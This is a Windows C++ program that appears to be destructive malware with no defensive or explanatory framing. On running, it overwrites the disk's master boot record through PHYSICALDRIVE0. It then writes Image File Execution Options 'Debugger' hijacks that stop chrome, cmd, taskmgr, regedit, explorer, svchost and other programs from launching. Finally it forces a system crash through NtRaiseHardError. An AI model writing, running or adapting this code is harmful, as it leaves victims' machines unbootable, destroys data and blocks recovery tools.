#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <stdio.h>

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

const ULONG SE_SHUTDOWN_PRIVILEGE = 19;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWCH   Buffer;
}UNICODE_STRING, *PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION
{
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, *PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE
{
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes
} HARDERROR_RESPONSE, *PHARDERROR_RESPONSE;

typedef NTSTATUS(NTAPI *NTRAISEHARDERROR)(
    IN NTSTATUS             ErrorStatus,
    IN ULONG                NumberOfParameters,
    IN PUNICODE_STRING      UnicodeStringParameterMask OPTIONAL,
    IN PVOID                *Parameters,
    IN HARDERROR_RESPONSE_OPTION ResponseOption,
    OUT PHARDERROR_RESPONSE Response
    );

typedef BOOL(NTAPI *RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PBOOLEAN);

HARDERROR_RESPONSE_OPTION ResponseOption = OptionShutdownSystem;
HARDERROR_RESPONSE Response;

NTRAISEHARDERROR NtRaiseHardError;
RTLADJUSTPRIVILEGE RtlAdjustPrivilege;

const std::wstring REG_FILE_CONTENT = LR"(Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options]

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe]
"Debugger"="chrome.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe]
"Debugger"="cmd.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe]
"Debugger"="mmc.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe]
"Debugger"="msedge.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]
"Debugger"="notepad.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe]
"Debugger"="reg.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe]
"Debugger"="regedit.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe]
"Debugger"="taskmgr.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe]
"Debugger"="svchost.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe]
"Debugger"="wininit.exe"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe]
"Debugger"="explorer.exe"

)";

std::wstring Trim(const std::wstring& str) {
    size_t first = str.find_first_not_of(L" \t\n\r");
    if (std::wstring::npos == first) {
        return str;
    }
    size_t last = str.find_last_not_of(L" \t\n\r");
    return str.substr(first, (last - first + 1));
}

std::vector<BYTE> HexStringToBytes(const std::wstring& hexStr) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hexStr.length(); i += 2) {
        std::wstring byteString = hexStr.substr(i, 2);
        if (byteString.length() == 2) {
            bytes.push_back(static_cast<BYTE>(std::stoi(byteString, nullptr, 16)));
        } else {
            continue;
        }
    }
    return bytes;
}

void ApplyRegString(const std::wstring& regContent) {
    std::wistringstream iss(regContent);
    std::wstring line;
    HKEY currentRootKey = NULL;
    std::wstring currentSubKeyPath;

    std::wregex keyPattern(L"\\[(HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_LOCAL_MACHINE|HKEY_USERS|HKEY_CURRENT_CONFIG)\\\\(.*)\\]");
    std::wregex valuePattern(L"\"([^\"]*)\"=(.*)");
    std::wregex defaultValPattern(L"@=(.*)");

    while (std::getline(iss, line)) {
        line = Trim(line);
        if (line.empty() || (line.length() >= 1 && line[0] == L';')) {
            continue;
        }

        std::wsmatch matches;

        if (std::regex_match(line, matches, keyPattern)) {
            std::wstring rootKeyStr = matches[1].str();
            currentSubKeyPath = matches[2].str();

            if (rootKeyStr == L"HKEY_CLASSES_ROOT") currentRootKey = HKEY_CLASSES_ROOT;
            else if (rootKeyStr == L"HKEY_CURRENT_USER") currentRootKey = HKEY_CURRENT_USER;
            else if (rootKeyStr == L"HKEY_LOCAL_MACHINE") currentRootKey = HKEY_LOCAL_MACHINE;
            else if (rootKeyStr == L"HKEY_USERS") currentRootKey = HKEY_USERS;
            else if (rootKeyStr == L"HKEY_CURRENT_CONFIG") currentRootKey = HKEY_CURRENT_CONFIG;
            else {
                currentRootKey = NULL;
                continue;
            }

            if (currentRootKey == NULL) {
                continue;
            }

            HKEY hKey;
            DWORD dwDisposition;
            LONG lResult = RegCreateKeyExW(
                currentRootKey,
                currentSubKeyPath.c_str(),
                0, NULL, REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE | KEY_CREATE_SUB_KEY,
                NULL, &hKey, &dwDisposition
            );

            if (lResult == ERROR_SUCCESS) {
                RegCloseKey(hKey);
            } else {
                currentRootKey = NULL;
            }
        }

        else if (currentRootKey != NULL) {
            std::wstring valueName;
            std::wstring valueDataStr;

            if (std::regex_match(line, matches, valuePattern)) {
                valueName = matches[1].str();
                valueDataStr = matches[2].str();
            } else if (std::regex_match(line, matches, defaultValPattern)) {
                valueName = L"";
                valueDataStr = matches[1].str();
            } else {
                continue;
            }

            HKEY hKey;
            LONG lOpenResult = RegOpenKeyExW(currentRootKey, currentSubKeyPath.c_str(), 0, KEY_SET_VALUE, &hKey);
            if (lOpenResult != ERROR_SUCCESS) {
                continue;
            }

            if (valueDataStr.length() >= 6 && valueDataStr.substr(0, 6) == L"dword:") {
                DWORD dwValue = std::stoul(valueDataStr.substr(6), nullptr, 16);
                RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(dwValue));
            } else if (valueDataStr.length() >= 7 && valueDataStr.substr(0, 7) == L"hex(2):") {
                std::wstring hexOnly = valueDataStr.substr(7);
                hexOnly.erase(std::remove(hexOnly.begin(), hexOnly.end(), L','), hexOnly.end());
                std::vector<BYTE> byteData = HexStringToBytes(hexOnly);
                if (byteData.empty() || *(reinterpret_cast<const WCHAR*>(byteData.data()) + (byteData.size() / sizeof(WCHAR) - 1)) != L'\0') {
                    byteData.push_back(0);
                    byteData.push_back(0);
                }

                RegSetValueExW(hKey, valueName.c_str(), 0, REG_EXPAND_SZ, byteData.data(), static_cast<DWORD>(byteData.size()));
            }
            else if (valueDataStr.length() >= 4 && valueDataStr.substr(0, 4) == L"hex:") {
                std::wstring hexOnly = valueDataStr.substr(4);
                hexOnly.erase(std::remove(hexOnly.begin(), hexOnly.end(), L','), hexOnly.end());
                std::vector<BYTE> byteData = HexStringToBytes(hexOnly);
                RegSetValueExW(hKey, valueName.c_str(), 0, REG_BINARY, byteData.data(), static_cast<DWORD>(byteData.size()));
            }
            else {
                if (valueDataStr.length() >= 2 && valueDataStr[0] == L'"' && valueDataStr[valueDataStr.length() - 1] == L'"') {
                    valueDataStr = valueDataStr.substr(1, valueDataStr.length() - 2);
                }
                size_t pos = 0;
                while ((pos = valueDataStr.find(L"\\\\", pos)) != std::wstring::npos) {
                    valueDataStr.replace(pos, 2, L"\\");
                    pos += 1;
                }
                pos = 0;
                while ((pos = valueDataStr.find(L"\\\"", pos)) != std::wstring::npos) {
                    valueDataStr.replace(pos, 2, L"\"");
                    pos += 1;
                }

                RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ, (LPBYTE)valueDataStr.c_str(), (valueDataStr.length() + 1) * sizeof(wchar_t));
            }
            RegCloseKey(hKey);
        }
    }
}

char temp[512]={};

void GetPrivileges() {
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp; 
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	tp.PrivilegeCount =1; 
	LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid); 
	tp.Privileges[0].Attributes =SE_PRIVILEGE_ENABLED; 
	AdjustTokenPrivileges(hTokenHandle,FALSE,&tp,sizeof(tp),NULL,NULL); 
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);
}

void ReadPHYSICALDRIVE0() {
	HANDLE hFile;
	DWORD dwReadSize;
	char str_Name[] = "\\\\.\\PHYSICALDRIVE0";
	hFile = CreateFile(str_Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL ,0);
	if (hFile == INVALID_HANDLE_VALUE) {
		MessageBox(0, "wrong", "wrong", 0);
	}
	BYTE pMBR[512] ={0};
	memcpy(pMBR,temp,sizeof(temp)-1);
	pMBR[510] =0x55;
	pMBR[511] = 0xAA;
	WriteFile(hFile, pMBR, 512, &dwReadSize, NULL);
}


int main() {
    GetPrivileges();
    ReadPHYSICALDRIVE0();
    ApplyRegString(REG_FILE_CONTENT);
    HMODULE  NtBase = GetModuleHandle(TEXT("ntdll.dll"));
    if (!NtBase) return false;

    NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(NtBase, "NtRaiseHardError");
    RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(NtBase, "RtlAdjustPrivilege");
    BOOLEAN B;
    if ((RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &B)) != 0)
    {
        printf("提权失败");
        return 0;
    }
    NtRaiseHardError(0xC0114514, 0, NULL, NULL, OptionShutdownSystem, &Response);
    return 0;
}